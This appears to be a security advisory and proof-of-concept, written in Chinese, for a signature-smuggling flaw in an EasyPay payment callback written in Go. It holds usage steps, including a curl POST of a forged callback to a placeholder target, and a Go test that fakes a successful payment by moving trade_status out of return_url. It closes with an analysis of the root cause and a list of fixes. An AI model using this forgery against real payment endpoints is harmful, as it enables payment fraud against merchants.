# EasyPay 支付回调签名走私（return_url 内嵌 trade_status 伪造支付成功）

- **code**: easypay-支付回调签名走私-return_url-内嵌-trade_status-伪造支付成功
- **kind**: poc
- **category**: auth-bypass
- **component**: EasyPay / 聚合支付回调（Go）
- **severity**: critical
- **language**: go
- **source**: manual
- **verified_note**: 本地 fixture 单测复现（EasyPay 结构体 + 固定 pid/pkey），未在真实站点验证；修复后该用例应断言 err != nil。
- **path**: pocs/easypay-支付回调签名走私-return_url-内嵌-trade_status-伪造支付成功/poc.go
- **tags**: payment,webhook,signature,parameter-smuggling,md5,go,business-logic
- **created_at**: 2026-10-06T12:14:47.193Z
- **found_by**: vuln-scan

## 描述

校验端把回调原文按裸 & 拼接成签名原文（值不做转义/走私检测），且 trade_status 这种权威业务状态不在签名域内。攻击者用自己下单拿到的合法签名，把 return_url 值里末尾的 `&trade_status=TRADE_SUCCESS`「搬」成顶层参数——因为拼接后字节完全相同，签名照旧通过，支付状态被伪造为成功。适用于所有「sorted(k=v) 拼接 + md5(...+key)」且未对值做百分号转义的支付 SDK。

## 用法

```
1) 自己下一单，从返回的支付 URL / 表单里取出 sign（签名原文含 return_url）。
2) 构造回调：其余参数与下单时逐字一致，return_url 只填 `&` 之前的前半段，把 `&trade_status=TRADE_SUCCESS` 提到顶层，再拼 `&sign=<sign>&sign_type=MD5`。
3) POST 到站点的 notify 地址：curl -X POST 'https://TARGET/api/v1/payment/webhook/easypay' --data-raw '<上面拼好的串>'。
4) 修复后的判定：VerifyNotification 必须返回签名错误/未知参数错误；未修复则 err==nil 且订单被置为已支付。
```

## 正文

```
func TestForgedCallback(t *testing.T) {
	e := &EasyPay{config: map[string]string{
		"pid": "1000", "pkey": "MERCHANT_SECRET_KEY",
		"apiBase":   "https://pay.example.com",
		"notifyUrl": "https://site.example.com/api/v1/payment/webhook/easypay",
	}}

	// 1. 下单：return_url 末尾藏着 trade_status=TRADE_SUCCESS
	returnURL := "https://site.example.com/payment/result?order_id=99&out_trade_no=ORDER123&status=success&trade_status=TRADE_SUCCESS"
	createParams := map[string]string{
		"pid": "1000", "type": "alipay", "out_trade_no": "ORDER123",
		"notify_url": e.config["notifyUrl"], "return_url": returnURL,
		"name": "balance recharge", "money": "650.00",
	}
	sign := easyPaySign(createParams, e.config["pkey"]) // 攻击者从自己支付 URL 里直接拿到

	// 2. 伪造回调：return_url 只编码前半段，trade_status 升为顶层参数
	prefix := "https://site.example.com/payment/result?order_id=99&out_trade_no=ORDER123&status=success"
	cb := url.Values{}
	cb.Set("pid", "1000"); cb.Set("type", "alipay"); cb.Set("out_trade_no", "ORDER123")
	cb.Set("notify_url", e.config["notifyUrl"]); cb.Set("name", "balance recharge")
	cb.Set("money", "650.00"); cb.Set("return_url", prefix)
	rawCallback := cb.Encode() + "&trade_status=TRADE_SUCCESS" + "&sign=" + sign + "&sign_type=MD5"

	n, err := e.VerifyNotification(context.Background(), rawCallback, nil)
	// 修复前：err == nil, n.Status == "success", n.Amount == 650 —— 伪造入账成功
}

// ── 为什么签名会通过：签名原文是「裸 & 拼接」，值里的 & 与顶层参数同形 ──
// 下单侧 canonical（键排序）：
//   money=650.00&name=balance recharge&notify_url=<N>&out_trade_no=ORDER123&pid=1000
//   &return_url=https://site.example.com/payment/result?order_id=99&out_trade_no=ORDER123&status=success&trade_status=TRADE_SUCCESS
//   &type=alipay
// 回调侧 canonical（return_url 截断 + trade_status 成顶层键）：
//   money=650.00&name=balance recharge&notify_url=<N>&out_trade_no=ORDER123&pid=1000
//   &return_url=https://site.example.com/payment/result?order_id=99&out_trade_no=ORDER123&status=success
//   &trade_status=TRADE_SUCCESS&type=alipay
// 两串字节完全一致 → md5 相同 → 校验通过。
// 根因两条：
//   ① 签名原文未对值做严格转义（& = ? 未编码），参数边界可被「搬运/走私」；
//   ② trade_status 不在签名域内，却被校验端当作权威业务状态直接采信。

// ── 修复要点 ──
// 1. 严格解析：逐对拆 &、按第一个 = 拆键值、强制 URL 解码、拒绝重复键与白名单外参数。
// 2. canonical 对键与值都做严格百分号编码（空格也转义），杜绝值内 &k=v 与顶层参数同形。
// 3. trade_status、money、out_trade_no、return_url/notify_url 全部纳入签名域。
// 4. 金额/订单归属/状态流转以本地库为准，签名只证明「来自网关」；重放走幂等。
// 5. 常量时间比较签名；sign_type 只认声明值，禁降级；有条件改 HMAC-SHA256。
// 6. return_url 必须落在自有域白名单，禁止把它当参数容器。
// 7. 兜底：向 EasyPay 主动查单二次确认，不只信推送。
```
